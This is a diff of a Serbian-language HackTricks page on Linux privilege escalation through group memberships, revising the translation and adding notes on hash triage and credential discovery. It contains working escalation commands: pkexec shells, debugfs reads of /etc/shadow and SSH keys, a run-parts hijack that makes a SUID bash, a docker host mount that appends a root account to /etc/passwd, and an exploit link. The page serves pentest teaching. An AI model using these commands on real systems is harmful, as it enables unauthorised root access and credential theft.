@@ -1,12 +1,12 @@
-# Interesting Groups - Linux Privesc
+# Zanimljive grupe - Linux Privesc
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Sudo/Admin Groups
+## Sudo/Admin grupe
 
 ### **PE - Method 1**
 
-**Ponekad**, **po defaultu (ili zato što neki softver to zahteva)** unutar **/etc/sudoers** datoteke možete pronaći neke od ovih linija:
+**Ponekad**, **po defaultu (ili zato što neki softver to zahteva)** u fajlu **/etc/sudoers** možete pronaći neke od ovih linija:
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -14,36 +14,36 @@
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
-To znači da **bilo koji korisnik koji pripada grupi sudo ili admin može izvršiti bilo šta kao sudo**.
+Ovo znači da **svaki korisnik koji pripada grupi sudo ili admin može да izvrši bilo šta kao sudo**.
 
-Ako je to slučaj, da **postanete root, možete jednostavno izvršiti**:
+Ako je to slučaj, да biste **postали root, jednostavno можете izvršiti**:
 ```
 sudo su
 ```
-### PE - Metod 2
+### PE - Metoda 2
 
-Pronađite sve suid binarne datoteke i proverite da li postoji binarna datoteka **Pkexec**:
+Pronađi sve suid binarne datoteke i proveri da li postoji binarna datoteka **Pkexec**:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-Ako otkrijete da je binarni fajl **pkexec SUID binarni fajl** i da pripadate grupi **sudo** ili **admin**, verovatno možete izvršavati binarne fajlove kao sudo koristeći `pkexec`.\
-To je zato što su obično to grupe unutar **polkit politike**. Ova politika u suštini identifikuje koje grupe mogu koristiti `pkexec`. Proverite to sa:
+Ako utvrdite da je **pkexec SUID binarni fajl** i da pripadate grupi **sudo** ili **admin**, verovatno možete izvršavati binarne fajlove kao sudo koristeći `pkexec`.\
+Ovo je zato što su to obično grupe unutar **polkit policy**. Ova politika u suštini identifikuje koje grupe mogu koristiti `pkexec`. Proverite to sa:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
-Tamo ćete pronaći koje grupe imaju dozvolu da izvrše **pkexec** i **po defaultu** u nekim linux distribucijama grupe **sudo** i **admin** se pojavljuju.
+Tamo ćete naći koje grupe imaju dozvolu da izvršavaju **pkexec**, a podrazumevano se u nekim Linux distribucijama pojavljuju grupe **sudo** i **admin**.
 
-Da **postanete root možete izvršiti**:
+Da **biste postali root možete izvršiti**:
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
-Ako pokušate da izvršite **pkexec** i dobijete ovu **grešku**:
+Ako pokušate da pokrenete **pkexec** i dobijete ovu **grešku**:
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**Nije zato što nemate dozvole, već zato što niste povezani bez GUI-a**. I postoji rešenje za ovaj problem ovde: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Potrebno vam je **2 različite ssh sesije**:
+**Nije zato što nemaš dozvole već zato što nisi povezan bez GUI-a**. A postoji rešenje za ovaj problem ovde: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Potrebna su ti **2 različite ssh sesije**:
 ```bash:session1
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -56,29 +56,35 @@ pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 ```
 ## Wheel Group
 
-**Ponekad**, **po defaultu** unutar **/etc/sudoers** datoteke možete pronaći ovu liniju:
+**Ponekad**, **podrazumevano**, u fajlu **/etc/sudoers** možete pronaći ovu liniju:
 ```
 %wheel	ALL=(ALL:ALL) ALL
 ```
-To znači da **bilo koji korisnik koji pripada grupi wheel može izvršavati bilo šta kao sudo**.
+Ovo znači da **bilo koji korisnik koji pripada grupi wheel može izvršavati bilo šta kao sudo**.
 
-Ako je to slučaj, da **postanete root, možete jednostavno izvršiti**:
+Ako je to slučaj, da biste **postali root, možete jednostavno izvršiti**:
 ```
 sudo su
 ```
-## Shadow Group
+## Shadow grupa
 
-Korisnici iz **grupe shadow** mogu **čitati** **/etc/shadow** datoteku:
+Korisnici iz **grupe shadow** mogu **čitati** datoteku **/etc/shadow**:
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
-So, pročitajte datoteku i pokušajte da **provalite neke heševe**.
+Dakle, pročitaj fajl i pokušaj da **crack some hashes**.
 
-## Grupa osoblja
+Kratka napomena o zaključavanju pri trijaži hash-eva:
+- Unosi sa `!` ili `*` obično ne dozvoljavaju interaktivnu prijavu lozinkom.
+- `!hash` obično znači da je lozinka postavljena, a zatim zaključana.
+- `*` obično znači da nikada nije postavljen validan hash lozinke.
+- Ovo je korisno za klasifikaciju naloga čak i kada je direktna prijava onemogućena.
 
-**staff**: Omogućava korisnicima da dodaju lokalne izmene u sistem (`/usr/local`) bez potrebe za root privilegijama (napomena da su izvršne datoteke u `/usr/local/bin` u PATH varijabli bilo kog korisnika, i mogu "prebrisati" izvršne datoteke u `/bin` i `/usr/bin` sa istim imenom). Uporedite sa grupom "adm", koja je više povezana sa nadzorom/bezbednošću. [\[source\]](https://wiki.debian.org/SystemGroups)
+## Staff grupa
 
-U debian distribucijama, `$PATH` varijabla pokazuje da će `/usr/local/` biti pokrenut kao najviši prioritet, bez obzira da li ste privilegovani korisnik ili ne.
+**staff**: Dozvoljava korisnicima da dodaju lokalne izmene sistema (`/usr/local`) bez potrebe za root privilegijama (imajte na umu da izvršni fajlovi u `/usr/local/bin` nalaze se u PATH promenljivoj svakog korisnika, i mogu prebrisati izvršne fajlove u `/bin` i `/usr/bin` sa istim imenom). Uporedite sa grupom "adm", koja je više vezana za monitoring/bezbednost. [\[source\]](https://wiki.debian.org/SystemGroups)
+
+U Debian distribucijama, promenljiva `$PATH` pokazuje da će `/usr/local/` biti izvršavan sa najvećim prioritetom, bez obzira da li ste privilegovani korisnik ili ne.
 ```bash
 $ echo $PATH
 /usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
@@ -86,9 +92,9 @@ $ echo $PATH
 # echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
-Ako možemo preuzeti neke programe u `/usr/local`, lako možemo dobiti root.
+Ako možemo hijack neke programe u `/usr/local`, lako možemo dobiti root.
 
-Preuzimanje `run-parts` programa je jednostavan način da se dobije root, jer većina programa pokreće `run-parts` kao (crontab, kada se prijavljuje ssh).
+Hijack `run-parts` programa je jednostavan način da se dobije root, jer će većina programa pokretati `run-parts` (npr. crontab ili prilikom ssh prijave).
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -96,7 +102,7 @@ $ cat /etc/crontab | grep run-parts
 47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
 52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
 ```
-ili Kada se prijavi nova ssh sesija.
+ili kada se uspostavi nova ssh sesija.
 ```bash
 $ pspy64
 2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
@@ -109,7 +115,7 @@ $ pspy64
 2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
 2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
 ```
-**Eksploatacija**
+**Exploit**
 ```bash
 # 0x1 Add a run-parts script in /usr/local/bin/
 $ vi /usr/local/bin/run-parts
@@ -128,11 +134,11 @@ $ ls -la /bin/bash
 # 0x5 root it
 $ /bin/bash -p
 ```
-## Disk Group
+## Grupa diskova
 
-Ova privilegija je gotovo **ekvivalentna root pristupu** jer možete pristupiti svim podacima unutar mašine.
+Ova privilegija je gotovo **ekvivalentna root access**, jer možete pristupiti svim podacima na mašini.
 
-Files:`/dev/sd[a-z][1-9]`
+Fajlovi:`/dev/sd[a-z][1-9]`
 ```bash
 df -h #Find where "/" is mounted
 debugfs /dev/sda1
@@ -141,47 +147,47 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-Napomena da pomoću debugfs možete takođe **pisati fajlove**. Na primer, da kopirate `/tmp/asd1.txt` u `/tmp/asd2.txt` možete uraditi:
+Imajte na umu da korišćenjem debugfs možete takođe **pisati fajlove**. Na primer, da kopirate `/tmp/asd1.txt` u `/tmp/asd2.txt`, možete uraditi:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-Međutim, ako pokušate da **pišete datoteke koje su u vlasništvu root-a** (kao što su `/etc/shadow` ili `/etc/passwd`), dobićete grešku "**Permission denied**".
+Međutim, ako pokušate da **pišete fajlove u vlasništvu root-a** (kao što su `/etc/shadow` ili `/etc/passwd`), dobićete grešku "**Permission denied**".
 
-## Video Grupa
+## Video grupa
 
-Korišćenjem komande `w` možete saznati **ko je prijavljen na sistem** i prikazaće izlaz kao što je sledeći:
+Korišćenjem komande `w` možete saznati **ko je prijavljen na sistem** i ona će prikazati izlaz sličan sledećem:
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
-**tty1** znači da je korisnik **yossi fizički prijavljen** na terminalu na mašini.
+**tty1** znači da je korisnik **yossi fizički prijavljen** na terminal na mašini.
 
-**video grupa** ima pristup za pregled izlaza sa ekrana. U suštini, možete posmatrati ekrane. Da biste to uradili, potrebno je da **uhvatite trenutnu sliku na ekranu** u sirovim podacima i dobijete rezoluciju koju ekran koristi. Podaci sa ekrana mogu se sačuvati u `/dev/fb0`, a rezoluciju ovog ekrana možete pronaći na `/sys/class/graphics/fb0/virtual_size`
+**video group** ima pristup za pregled izlaza ekrana. U suštini možete posmatrati sadržaj ekrana. Da biste to uradili, potrebno je da **uhvatite trenutnu sliku na ekranu** kao sirove podatke i saznate rezoluciju koju ekran koristi. Podaci ekrana mogu se sačuvati u `/dev/fb0`, a rezoluciju ovog ekrana možete pronaći u `/sys/class/graphics/fb0/virtual_size`
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-Da biste **otvorili** **sirovu sliku**, možete koristiti **GIMP**, odabrati **`screen.raw`** datoteku i kao tip datoteke odabrati **Sirovi podaci o slici**:
+Da biste **otvorili** **raw image** možete koristiti **GIMP**, izaberite fajl **`screen.raw`** i kao tip fajla izaberite **Raw image data**:
 
 ![](<../../../images/image (463).png>)
 
-Zatim modifikujte Širinu i Visinu na one koje koristi ekran i proverite različite Tipove slika (i odaberite onaj koji bolje prikazuje ekran):
+Zatim izmenite Width i Height na vrednosti koje se koriste na ekranu i proverite različite Image Types (i izaberite onaj koji najbolje prikazuje ekran):
 
 ![](<../../../images/image (317).png>)
 
-## Root Grupa
+## Grupa root
 
-Izgleda da po defaultu **članovi root grupe** mogu imati pristup da **modifikuju** neke **konfiguracione** datoteke usluga ili neke **biblioteke** ili **druge zanimljive stvari** koje se mogu koristiti za eskalaciju privilegija...
+Izgleda da po defaultu **članovi root grupe** mogu imati pristup da **izmenjuju** neke **service** konfiguracione fajlove ili neke fajlove **libraries** ili **druge zanimljive stvari** koje bi mogle biti iskorišćene za eskalaciju privilegija...
 
-**Proverite koje datoteke članovi root grupe mogu modifikovati**:
+**Proverite koje fajlove članovi root grupe mogu izmeniti**:
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
-## Docker Grupa
+## Docker Group
 
-Možete **montirati root datotečni sistem host mašine na volumen instance**, tako da kada se instanca pokrene, odmah učitava `chroot` u taj volumen. Ovo vam efektivno daje root pristup na mašini.
+Možete **montirati root filesystem host mašine na volume instance**, tako da kada se instance pokrene, odmah učitava `chroot` u taj volume. Ovo vam efektivno daje root na mašini.
 ```bash
 docker image #Get images from the docker service
 
@@ -193,17 +199,20 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-Na kraju, ako vam se ne sviđaju neki od prethodnih predloga, ili ne rade iz nekog razloga (docker api firewall?), uvek možete pokušati da **pokrenete privilegovanu kontejner i pobegnete iz njega** kao što je objašnjeno ovde:
+Na kraju, ako ti nijedna od prethodnih sugestija ne odgovara ili ne radi iz nekog razloga (docker api firewall?), uvek možeš pokušati da **run a privileged container and escape from it** kao što je objašnjeno ovde:
+
 
 {{#ref}}
 ../container-security/
 {{#endref}}
 
-Ako imate dozvole za pisanje preko docker socket-a, pročitajte [**ovaj post o tome kako eskalirati privilegije zloupotrebom docker socket-a**](../index.html#writable-docker-socket)**.**
+Ako imaš write permissions over the docker socket pročitaj [**this post about how to escalate privileges abusing the docker socket**](../index.html#writable-docker-socket)**.**
+
 
 {{#ref}}
 https://github.com/KrustyHack/docker-privilege-escalation
 {{#endref}}
+
 
 {{#ref}}
 https://fosterelli.co/privilege-escalation-via-docker.html
@@ -211,18 +220,29 @@ https://fosterelli.co/privilege-escalation-via-docker.html
 
 ## lxc/lxd Grupa
 
+
 {{#ref}}
 ./
 {{#endref}}
 
-## Adm Grupa
+## Adm grupa
 
-Obično **članovi** grupe **`adm`** imaju dozvole da **čitaju log** fajlove smeštene unutar _/var/log/_.\
-Stoga, ako ste kompromitovali korisnika unutar ove grupe, definitivno biste trebali da **pogledate logove**.
+Obično **members** grupe **`adm`** imaju dozvole da **read log** fajlove koji se nalaze u _/var/log/_.\
+Dakle, ako si kompromitovao korisnika koji je član ove grupe, svakako treba da pogledaš logove.
+
+## Backup / Operator / lp / Mail grupe
+
+Ove grupe su često **credential-discovery** vektori više nego direktni root vektori:
+- **backup**: može otkriti arhive sa konfiguracijama, ključevima, DB dumpovima ili tokenima.
+- **operator**: platform-specific operativni pristup koji može leak-ovati osetljive runtime podatke.
+- **lp**: print queues/spools mogu sadržati sadržaj dokumenata.
+- **mail**: mail spools mogu otkriti reset links, OTPs i interne kredencijale.
+
+Smatraj članstvo ovde nalazom visokovredne izloženosti podataka i pivotiraj kroz password/token reuse.
 
 ## Auth grupa
 
-Unutar OpenBSD **auth** grupa obično može da piše u foldere _**/etc/skey**_ i _**/var/db/yubikey**_ ako se koriste.\
-Ove dozvole mogu biti zloupotrebljene sledećim eksploatom da bi se **eskalirale privilegije** na root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+U OpenBSD-u grupa **auth** obično može pisati u foldere _**/etc/skey**_ i _**/var/db/yubikey**_ ako se koriste.\
+Ove dozvole se mogu zloupotrebiti pomoću sledećeg exploita da bi se **escalate privileges** do root-a: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
 
 {{#include ../../../banners/hacktricks-training.md}}
